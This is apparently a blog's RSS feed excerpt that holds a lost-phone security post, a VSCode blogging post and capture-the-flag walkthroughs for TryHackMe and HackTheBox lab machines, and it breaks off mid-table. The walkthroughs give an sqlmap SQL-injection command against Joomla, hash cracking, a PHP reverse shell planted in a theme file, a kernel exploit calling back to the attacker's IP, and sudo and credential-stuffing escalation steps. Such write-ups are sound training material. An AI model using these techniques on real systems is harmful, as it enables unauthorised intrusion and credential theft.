]]></description></item><item><title>Lessons learned from a lost phone</title><link>https://www.masoopy.com/lessons-learned-from-a-lost-phone/</link><pubDate>Tue, 04 May 2021 08:26:09 +0200</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/lessons-learned-from-a-lost-phone/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/05/lost-phone.jpg" referrerpolicy="no-referrer">
            </div><p>For the first time in my life, a few days ago, I lost my phone and it was most probably stolen a few minutes later&hellip; So what went wrong, and what went right and how is a life without a phone in 2020?</p>
<h2 id="what-went-wrong">What went wrong?</h2>
<p>I lost my phone, this is clearly what went wrong! Ok, just kidding, I&rsquo;ll tell you what went really wrong once I no longer had my phone.</p>
<p>I am almost pretty sure that I lost it / forgot it somewhere, and that someone stole it right away. Phone was on and I was using it at some point, I still have timestamp of my last sent message, then a few minutes after, I no longer have my phone. When someone tried to call me right away, it went straight to voicemail.</p>
<p>So, what really went wrong?</p>
<p>First of all, I didn&rsquo;t had a PIN code on my SIM card. I felt it was so 1990 and thought that with unlimited data, calls, and SMS on my plan, losing my SIM was low risk. I was wrong. The risk here is that someone with access to my SIM could call a pay-per-minute line, even a line the thief would have set-up himself. This could easily cause several hundreds or a few thousands Euro damage as we can learn from the <a href="https://darknetdiaries.com/episode/1/" target="_blank" rel="noopener noreferrer">first episode of Darknet Diaries</a>.</p>
<p>This meant I had to suspend my line right away to avoid additional costs! This also meant that with my line now suspended, I could no longer use feature to locate my phone and remotely erase it, such as <a href="https://www.google.com/android/find" target="_blank" rel="noopener noreferrer">Android Find</a> and <a href="https://www.apple.com/icloud/find-my/" target="_blank" rel="noopener noreferrer">Find My Apple</a>.</p>
<p>My phone was locked with a 6 chars PIN, plus I suppose it was quickly turned off by the thief, considering how fast it went offline, and it requires a needle to remove the SIM. So, I decided my data inside was probably safe (I also had another trick in my sleeve, more on that later) and the real risk was to avoid extra cost and usurpation by someone having access to my phone line.</p>
<p>I have a backup phone, but no extra SIM. It is an old phone and a &ldquo;transitional&rdquo; phone. I keep it when I have hardware issue / break current phone, etc. I just have to put the SIM card in it, and everything is set up. It already served its purpose a few times!</p>
<p>So I tried to buy a new phone on Amazon (where I usually buy too many stuff).</p>
<p>In order to confirm my order, I had to authenticate on my bank website and approve the payment. Which I did. Now my bank asked me to confirm the approbation I just gave via an - wait for it - text message !</p>
<p>Yup, I probably have hundreds of orders at amazon, with the same computer and IP, and they almost never asked me to confirm an order with my bank&hellip; and my bank never ask me to confirm &ldquo;twice&rdquo;&hellip; probably because I used to confirm orders (from other sites) with the phone app, and never did with the &ldquo;regular&rdquo; website from my computer&hellip;</p>
<p>That&rsquo;s a nice chicken / egg scenario where you have no phone, but require one to get one&hellip;</p>
<p>Hopefully, the rest went fine !</p>
<h2 id="what-went-right">What went right?</h2>
<p>Wherever I can, I use TOTP tokens as 2FA instead of text message. I have read horror stories about phone lines being &ldquo;defaced&rdquo;, and decided a long time ago that phone verification wasn&rsquo;t a safe thing to do.</p>
<p>Now, just doing that isn&rsquo;t enough, because if you only have one authenticator app and if it is on your phone, then you are toasted! I use multiple instances of different authenticators. I have <a href="https://authy.com/" target="_blank" rel="noopener noreferrer">Authy</a> on my phone AND on my desktop, and also <a href="https://bitwarden.com/help/article/authenticator-keys/" target="_blank" rel="noopener noreferrer">Bitwarden</a> self hosted. This means, that without my phone, I can continue to log in any 2FA websites.</p>
<p>As I told you before, I was pretty confident my data was safe. I believe the thief went for the device and not the data itself, plus the phone was locked, etc.</p>
<p>However, I still have sensitive data and access granted to all my accounts : mail, Nextcloud, VPN access, etc.</p>
<p>I simply logged into all my accounts from my computer and revoked all accesses for the phone and then disconnected all sessions (this is where the authenticator was need to log back in from my main computer), and of course revoked my VPN access.</p>
<h2 id="now-what">Now what?</h2>
<p>I&rsquo;ll keep waiting a few days in case my phone turns up, but if it doesn&rsquo;t happen then I&rsquo;ll contact authorities and have the IMEI blacklisted.</p>
<p>I&rsquo;ll also use a PIN code on my next SIM, which means if something similar happens again, I could wait for the phone to turn up without having to worry about additional costs and/or usurpation. Not that it would help me recover the phone, but still could be fun to be able to track it!</p>
<h2 id="living-without-a-phone">Living without a phone</h2>
<p>As an end note, I&rsquo;d like to point out how it is to live without a phone in 2020s. In my case, I am currently out of my home the whole week : monday to friday, nights included.</p>
<p>Want to order sushi? Need a phone to receive a text message to confirm payment, or a landline to call the restaurant. Want to order a new phone? Probably need a new phone as well&hellip; Not a home and no clock nor watch? Need a phone as well! Sending a quick message via Telegram or the like? Well, a phone is still easier ! Need internet access for your laptop because you are not home? A phone will come handy, once again&hellip; Have a few phone calls to do? Well&hellip;</p>
<p>While it wasn&rsquo;t as hard as I thought it would be, living without a phone nowadays can still be tricky.</p>
]]></description></item><item><title>THM - DailyBugle without MetaSploit</title><link>https://www.masoopy.com/thm-dailybugle-without-metasploit/</link><pubDate>Wed, 17 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-dailybugle-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/03/DailyBugle_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>This box looks promising, featuring a real life CMS, <a href="https://www.joomla.org/" target="_blank" rel="noopener noreferrer">Joomla</a>, and one that is quite often in the wild too! It is even a CMS I used several years ago, for one of my blog!</p>
<p>Let&rsquo;s see right now, if we can get in!</p>
<h2 id="target">Target</h2>
<p><a href="https://tryhackme.com/room/dailybugle" target="_blank" rel="noopener noreferrer">THM - DailyBugle</a></p>
<h2 id="recon">Recon</h2>
<p>Quick recon according to logo and info :</p>
<ul>
<li>Linux ;</li>
<li>Joomla CMS, SQLi ;</li>
<li>Privesc via yum.</li>
</ul>
<h2 id="enum">Enum</h2>
<p>Usual <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans/$target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 13:45 CET
Nmap scan report for $target_ip ($target_ip)
Host is up (0.034s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
</code></pre></td></tr></table>
</div>
</div><h2 id="exploitation">Exploitation</h2>
<p>Manually browsing to the website confirms a Joomla website. Let&rsquo;s run <code>joomscan</code> in order to gather more info. We are especially interested about the version. Since we are looking for a known SQL injection.</p>
<p>After a few seconds, it happens our target is running <code>Joomla 3.7.0</code> :</p>
<p></p>
<p>According to <a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="noopener noreferrer">exploit-db</a>, which confirms the <code>SQLi</code>, we can now run <code>sqlmap</code> like shown below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sqlmap -u &#34;http://$target_ip/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
</code></pre></td></tr></table>
</div>
</div><p>While having this info is cool, it looks tedious to get what I am looking for.</p>
<p>Doing a little more research for an easy win, I came across a <a href="https://github.com/stefanlucas/Exploit-Joomla" target="_blank" rel="noopener noreferrer">Python script</a> to exploit this vuln, and it directly returned juicy info :</p>
<p></p>
<p>Looking on internet, this hash appears to be bcrypt, so let&rsquo;s try to crack it with hashcat:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">hashcat -m 3200 jonah.hash /usr/share/wordlists/rockyou.txt
</code></pre></td></tr></table>
</div>
</div><p>After a little while, it worked :</p>
<p></p>
<p>Doing a little more internet research, I found that there is another vuln in Joomla that allows an <a href="https://vk9-sec.com/reverse-shell-on-any-cms/" target="_blank" rel="noopener noreferrer">admin user to get reverse shell</a>&hellip;</p>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>According to the link above, I edited a php file from an existing theme, replacing it with a <code>PHP reverse shell</code> (the one from Kali / Parrot, located in <code>/usr/share/webshell</code>), saved it, and called the URL : <code>http://$target_ip/templates/beez3/index.php</code> where <code>beez3</code> is the theme&rsquo;s name and <code>index.php</code> the file I edited.</p>
<p>It got me my foothold :</p>
<p></p>
<p>We are <code>www-data</code> user, (un)fortunately and need to privesc!</p>
<h3 id="privesc">PrivEsc</h3>
<p>In order to do so, I downloaded and ran <code>linpeas.sh</code> on the target.</p>
<p>After a little while, it discovered interesting information such as <code>jjameson</code> user, a password in Joomla&rsquo;s <code>configuration.php</code>, and other things&hellip; As always, I was looking for an easy win, and tried to connect via SSH with the credentials I found&hellip; and it worked!</p>
<p>I was now, in as <code>jjameson</code> with a real shell, stable connection and easy way to come back in!</p>
<p>First command I issued was <code>sudo -l</code> in order to see if I could do anything as <code>root</code>. It turns out, I was allowed to run <code>yum</code>, which was very promising.</p>
<p>A quick look at <a href="https://gtfobins.github.io/gtfobins/yum/#sudo" target="_blank" rel="noopener noreferrer">GTFObins</a> confirmed another easy win was probably coming. I simply copied/pasted (but also analyzed it, to make sure I understood what it did; there is no learning if you blindly copy/paste) the bits of code, and got a <code>root shell</code> :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>I found this box quite &ldquo;straightforward&rdquo; and very fun : chaining multiple vulns, in order to get a shell, then user misconfiguration in order to pwn a specific user and finally become <code>root</code>!</p>
<p>I am pretty sure, there are other ways to get <code>root</code> on this box (maybe with <code>kernel</code>, or <code>sudo</code> directly), but for once, I wanted to go the &ldquo;intended&rdquo; way.</p>
]]></description></item><item><title>HTB - Bastard without MetaSploit</title><link>https://www.masoopy.com/htb-bastard-without-metasploit/</link><pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-bastard-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/03/Bastard_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>Let&rsquo;s up the game a little bit and attack a medium rated box for the very first time!</p>
<h2 id="target">Target</h2>
<p><a href="URL" rel="">HTB - Bastard</a></p>
<h2 id="recon">Recon</h2>
<p>A quick look to the box info reveals :</p>
<ul>
<li>Windows box ;</li>
<li>Misc : php, web, patch management.</li>
</ul>
<p>I assume this will be about an outdated PHP application running under Windows.</p>
<h2 id="enum">Enum</h2>
<p>We run our classic <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 12:23 CET
Nmap scan report for bastard.htb (10.129.90.188)
Host is up (0.024s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   23.34 ms 10.10.14.1
2   23.46 ms bastard.htb (10.129.90.188)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.23 seconds
</code></pre></td></tr></table>
</div>
</div><p>We also run our team of usual&rsquo;s suspects tools, such as <code>nikto</code> and <code>gobuster</code> and manually <code>browsing</code> with <code>Burp</code> enabled.</p>
<p>We&rsquo;ll notice a <code>Drupal 7.54</code> installation which is vulnerable to <a href="https://github.com/dreadlocked/Drupalgeddon2" target="_blank" rel="noopener noreferrer">Drupalgeddon 2</a> :</p>
<p></p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>Manually exploiting the vuln with the ruby script found during our recon will give us an initial shell as <code>authority\iusr</code> :</p>
<p></p>
<p>It is now time for internal recon, before we try to escalate our privs!</p>
<h3 id="privesc">PrivEsc</h3>
<p>Since our shell is quite limited, we&rsquo;ll have to find several to get what we want. For example, running winpeas and similar tools won&rsquo;t work. It will time out before we can get the results, and I couldn&rsquo;t find a way to write the output to a logfile.</p>
<p>After searching, I found <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener noreferrer">Windows Exploit Suggester</a>. It is a <code>python2 script</code> that works on my attacking machine from the output of the <code>systeminfo</code> command :</p>
<p></p>
<p>So going down the list I found one kernel exploit that seemed particularly interesting : <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener noreferrer">MS10-059</a>.</p>
<p>Once uploaded, just run it without argument and it&rsquo;ll tell you that it requires an IP and port, in order to pop a reverse shell.</p>
<p>So I ran it like so :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">MS10-059.exe &#34;$attacking_ip&#34; &#34;1234&#34;
</code></pre></td></tr></table>
</div>
</div><p>Hopefully, it worked and gave me <code>SYSTEM</code> :</p>
<p></p>
<p>Harvest flag and call it a day :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>This has been my first even &ldquo;medium&rdquo; rated box and I am very happy I did it on my own. I found this initial shell pretty easy, but then got quite confused when I couldn&rsquo;t work with <code>winpeas</code> and other executables. This is when I started researching for other way to enum the box and found the <code>python exploit suggester</code>. From, here it was some googling and mor trial and error, but it worked!</p>
]]></description></item><item><title>THM - Skynet without MetaSploit</title><link>https://www.masoopy.com/thm-skynet-without-metasploit/</link><pubDate>Mon, 01 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-skynet-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/02/Skynet_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>A new, mysterious box. It is Terminator themed, but I have no idea what it will reveal Let&rsquo;s dive in!</p>
<h2 id="target">Target</h2>
<p><a href="https://tryhackme.com/room/skynet" target="_blank" rel="noopener noreferrer">THM - Skynet</a></p>
<h2 id="recon">Recon</h2>
<p>Not much recon here. Contrary to our previous targets which were &ldquo;training boxes&rdquo;, this one is doesn&rsquo;t hold your hand. Let&rsquo;s directly enumerate it!</p>
<h2 id="enum">Enum</h2>
<p>Usual <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-02-27T02:05:39-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-02-27T08:05:39
|_  start_date: N/A

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   31.41 ms 10.11.0.1
2   31.82 ms 10.10.223.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 27 09:05:36 2021 -- 1 IP address (1 host up) scanned in 51.35 seconds
</code></pre></td></tr></table>
</div>
</div><p>we find the following <code>Samba</code> shares :</p>
<p></p>
<p>Enumerating them further will reveal juicy info inside <code>anonymous</code> such as passwords' list and a message telling us that all employees are required to change their passwords.</p>
<p><code>Nikto</code> and <code>gobuster</code> will reveal a <code>SquirrelMail version 1.4.23 [SVN]</code> installation :</p>
<p></p>
<h2 id="exploitation">Exploitation</h2>
<p>Now, using <code>Burp</code>, we&rsquo;ll try some <a href="https://en.wikipedia.org/wiki/Credential_stuffing" target="_blank" rel="noopener noreferrer">credentials stuffing</a> in order to login. From our first SMB recon, we discovered a plausible user : <code>milesdyson</code>, and a list of passwords.</p>
<p>In the intruder&rsquo;s tab set up a <code>sniper</code> attack, using <code>milesdyson</code> as user and the password field as the only payload :</p>
<p></p>
<p>We, now, load the password list found during SMB enumeration :</p>
<p></p>
<p>And finally, we add a &ldquo;grep condition&rdquo; in order to filter our results :</p>
<p></p>
<p>After a little while, we find a working set of credentials:</p>
<p></p>
<p>and we are in Miles' mailbox !</p>
<p>Now, reading Miles' email, we&rsquo;ll find a password for Samba :</p>
<p></p>
<p>We can now use it in order to connect to the Samba share, like so : <code>smbclient \\\\$target_ip\\milesdyson -U milesdyson</code></p>
<p></p>
<p>Exploring the share will reveal an odd file called <code>important.txt</code>. Inside this file, we learn the existence of new <code>CMS</code> located at : <code>http://$target_ip/45kra24zxs28v3yd/</code>.</p>
<p>Further scanning reveals admin page :</p>
<p></p>
<p>Doing a quick search, we&rsquo;ll find the <code>Cuppa CMS</code> is vulnerable to <a href="https://www.exploit-db.com/exploits/25971" target="_blank" rel="noopener noreferrer">RFI/LFI</a>.</p>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>We craft the URL to match our target, replacing <code>cuppa</code> by <code>administrator</code>, set up a <code>listener</code> and get initial shell :</p>
<p></p>
<p>We harvest <code>user's flag</code> in <code>milesdyson</code>&rsquo;s home folder :</p>
<p></p>
<h3 id="privesc">PrivEsc</h3>
<p>We download our classic tools to the box and launch them. Unfortunately here, I didn&rsquo;t find anything obvious. I tried a few probable exploits, such as <code>dirtyc0w</code>, and a few others, but nothing worked.</p>
<p>Finally, I paid closer attention to kernel version, and noticed that <code>4.8.0-58-generic</code> might be <a href="https://www.exploit-db.com/exploits/43418" target="_blank" rel="noopener noreferrer">vulnerable</a>.</p>
<p>After a few quick steps of download, compile, &ldquo;send&rdquo; to target, I was ready to run it, and BOOM! it worked:</p>
<p></p>
<p>Finally, we collect <code>root's flag</code> :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>Another box rooted, it seems that even the inventor of <a href="https://terminator.fandom.com/wiki/Neural_Net_CPU" target="_blank" rel="noopener noreferrer">neural-net processor</a> can&rsquo;t resist us! :)</p>
]]></description></item><item><title>Blogging With VSCode</title><link>https://www.masoopy.com/blogging-with-vscode/</link><pubDate>Mon, 22 Feb 2021 20:49:23 +0100</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/blogging-with-vscode/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/02/VSCode.png" referrerpolicy="no-referrer">
            </div><p>In a previous post, I explained <a href="https://www.masoopy.com/going-from-wordpress-to-hugo-and-github-actions/" target="_blank" rel="noopener noreferrer">why I left Wordpress and how I did the move to Hugo</a>. Now, let me explain how I write my articles.</p>
<h2 id="blogging-in-markdown">Blogging in Markdown</h2>
<p>One of the main reason that me want to change what I used to do for several years was <a href="https://daringfireball.net/projects/markdown/" target="_blank" rel="noopener noreferrer">Markdown</a>. I love the simplicity of this format, and it gives me great flexibility! I can start writing an article at home in my IDE, and continue it on my mobile phone, or from any computer using an SSH access. The final articles are flat files, no DB, no fuss!</p>
<h2 id="why-vscode">Why VSCode?</h2>
<p>I started doing it with <code>vim</code>, like the rest of my &ldquo;code&rdquo; (I don&rsquo;t code, just write some bash and <code>ansible</code>), but lately I wanted something a bit less CLI for this kind of tasks. While I still use <code>vim</code> when I need to play with pattern of text, I now prefer an IDE with a GUI for projects with multiple files.</p>
<p>After trying a few of them, I decided to use <a href="https://code.visualstudio.com/" target="_blank" rel="noopener noreferrer">VSCode</a>. It is free, looks modern, has a <a href="https://www.nordtheme.com/" target="_blank" rel="noopener noreferrer">Nord theme</a>, and plenty of extensions!</p>
<h2 id="extensions-for-blogging">Extensions for blogging</h2>
<p>Since an IDE first role, isn&rsquo;t to write text, but code, this is where the vast amount of extensions that VSCode has to offer come useful!</p>
<p>Here are the ones I use :</p>
<ul>
<li>Spell check extension, a must-have for grammar and syntax spellchecking : <a href="https://github.com/davidlday/vscode-languagetool-linter" target="_blank" rel="noopener noreferrer">LanguageTool Linter for Visual Studio Code</a> ;</li>
<li>Since I am writing bits of code here and there, it avoids typo in those : <a href="https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker" target="_blank" rel="noopener noreferrer">Code Spell Checker</a> ;</li>
<li><a href="https://github.com/arcticicestudio/nord-visual-studio-code" target="_blank" rel="noopener noreferrer">Nord Theme</a>.</li>
</ul>
<p>And, that&rsquo;s it!</p>
<h2 id="writing-pipeline">Writing pipeline</h2>
<p>Has I have already explained, my blogging pipeline is now automated : I write, and it is automatically published once I push to the repo.</p>
<p>Now, the cool thing with <code>VSCode</code> (and many IDEs, or <code>vim</code> even), is that I can set up and integrate git into it! It means that VSCode will monitor changes and propose to commit + push them in just a few clicks! This is super convenient and pretty cool.</p>
<h2 id="just-write">Just write!</h2>
<p>This whole new setup allow me to &ldquo;just write&rdquo;! I don&rsquo;t have to deal with online editor, or updates done to them, I do not depend on someone&rsquo;s logic for using a WYSIWYG editor.</p>
<p>Last but not least, the day I want to change, I am pretty sure I&rsquo;ll find tons of way to convert Markdown to anything I like by that time!</p>
]]></description></item><item><title>THM - GameZone</title><link>https://www.masoopy.com/thm-gamezone/</link><pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-gamezone/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/02/GameZone_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>Trying to get a change from <a href="https://www.masoopy.com/tags/htb/" target="_blank" rel="noopener noreferrer">HTB</a>, today I&rsquo;ll write about a <a href="https://www.masoopy.com/tags/thm/" target="_blank" rel="noopener noreferrer">THM</a> box! And this time, we&rsquo;ll also have a look at SQLi!</p>
<h2 id="target">Target</h2>
<p><a href="https://tryhackme.com/room/gamezone" target="_blank" rel="noopener noreferrer">THM - GameZone</a></p>
<h2 id="recon">Recon</h2>
<p>Quick recon according to logo and info :</p>
<ul>
<li>Linux ;</li>
<li>Misc: SSH, SQLi (which means a web server).</li>
</ul>
<h2 id="enum">Enum</h2>
<p>Let&rsquo;s start a full <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
